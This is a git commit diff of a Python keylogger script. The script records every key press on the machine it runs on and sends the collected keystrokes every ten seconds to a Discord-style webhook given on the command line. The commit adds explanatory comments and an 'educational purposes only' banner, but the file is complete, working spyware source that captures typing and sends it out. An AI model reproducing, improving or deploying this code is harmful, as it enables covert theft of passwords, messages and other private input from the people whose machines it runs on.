6044dd561145d904c1e51cbee1cb1b9fd1e320c3
hun7er-py <92925663+hun7er-py@users.noreply.github.com>
2022-08-15 01:21:07 +0200

    Updated
    More reliable capture + comments

--- keylogger_webhook.py
+++ keylogger_webhook.py
@@ -1,74 +1,106 @@
+#_______________________________________________________________________________________
+#    __             _____             __ __ ________  ____    ____  ______              |
+#   / /_  __  _____/__  /__  _____   / //_// ____/\ \/ / /   / __ \/ ____/              |
+#  / __ \/ / / / __ \/ / _ \/ ___/  / ,<  / __/    \  / /   / / / / / __                |
+# / / / / /_/ / / / / /  __/ /     / /| |/ /___    / / /___/ /_/ / /_/ /                |
+#/_/ /_/\__,_/_/ /_/_/\___/_/     /_/ |_/_____/   /_/_____/\____/\____/                 |
+#                                                                                       |
+# Github : https://github.com/hun7er-py                                                 |
+#                                                                                       |
+# For educational purposes only. Please do not use for malicious means                  |                                                                                |
+#_______________________________________________________________________________________|
+
+
+#importing the necessary modules
+
 import keyboard
 from threading import Timer
-from datetime import datetime
-import webbrowser
 from nextcord import SyncWebhook
 import json
 import requests
 import sys
 
-SEND_REPORT_EVERY = 10# in seconds
-WEBHOOK_URL = ""
+#_____________________________________________________________________________
 
+SEND_REPORT_EVERY = 10# in seconds. Self explanatory.
+WEBHOOK_URL = "" #webhook url, preferably Discord
+
+#_____________________________________________________________________________
 
 class Keylogger:
     def __init__(self, interval, url):
+        #take the arguments and put them in class-scoped variables
         self.interval = interval
         self.log = ""
-        # record start & end date+time
-        self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
         self.url = url
 
+    #callback happens when a key in pressed with the import of keyboard
+    #the callback method has 1 argument, event (which will be for exampel keyboard.Key.enter, with the name being enter)
     def callback(self, event):
-        name = event.name
+        #we need to take the name of the key pressed in a string format
+        name = event.name 
+        #if the length of the name is bigger than 1, it means it's not a letter or number, but a function/mod key
         if len(name) > 1:
-            
             if name == "space":
                 name = " "
             elif name == "enter":
-                name = "[ENTER]\n"
+                name = "\n"
             elif name == "decimal":
                 name = "."
-            else:
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-        self.log += name
+            elif name == "tab":
+                name == "\t"
+            elif name == "backspace" and len(self.log) == 0:
+                #since there is nothing in the log, we cant delete anything, but we need to put the capture to NULL
+                name = "" 
+            elif name == "backspace" and len(self.log) > 0:
+                #we delete the last entry in our logs
+                self.log = self.log[:-1] 
+                name = ""
+            #other keys like shift, control etc will be NULL and not included.
+            else: 
+                name = "" 
+        #append the capture to our log
+        self.log += name 
 
-    def report_to_hook(self):
-        webhook = SyncWebhook.from_url(self.url)
-        webhook.send(self.log)
-
+    #reporting the lgos
     def report(self):
+        #first we have to check if the log is empty or not. Suprise! You can't send empty (meaning NULL) messages to a webhook.
         if self.log:
-            self.end_dt = datetime.now()
-            #self.update_filename()
-            self.report_to_hook()
-            #self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            self.start_dt = datetime.now()
-        self.log = ""
-        timer = Timer(interval=self.interval, function=self.report)
+            #make a new webhook object with our url
+            webhook = SyncWebhook.from_url(self.url)
+            #send the current log string 
+            webhook.send(self.log) 
+        #resetting the log string
+        self.log = "" 
+        #defining a new timer with our interval and pointing to this function, so it only executes every <interval> seconds
+        timer = Timer(interval=self.interval, function=self.report) 
+        #keeps on going
         timer.daemon = True
-        # start the timer
-        timer.start()
+        # start the timer 
+        timer.start() 
 
 
     def start(self):
-        self.start_dt = datetime.now()
         # start the keylogger
-        keyboard.on_release(callback=self.callback)
+        keyboard.on_press(callback=self.callback)#also possible with the .on_release, however we found skipped inputs in our final logs
+        #report the log
         self.report()
+        #wait for keyboard input
         keyboard.wait()
 
+#main method, will create a keylogger that will handle the rest
 def main(argv):
-    print(argv)
-    print(WEBHOOK_URL)
-    webbrowser.open("https://www.google.com")
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, url=argv)
-    keylogger.start()
+    #make new Keylogger object with our specifications (the report interval and report webhook)
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, url=argv) 
+    #starting the keylogger)
+    keylogger.start() 
 
+#Here we're handling the call to our script
 if __name__ == "__main__":
     try:
-        main(sys.argv[1])
+        #argument will need to be the webhook url. 
+        main(sys.argv[1]) 
+
     except:
-        print("Please provide a valid webhook URL and use it like this : \n python3 hun7er.py <webhookurl>")
+        #in case there is an error (most likely because of the absence of a valid URL)
+        print("Please provide a valid webhook URL and use it like this : \n python3 logger.py/.exe <webhookurl>") 
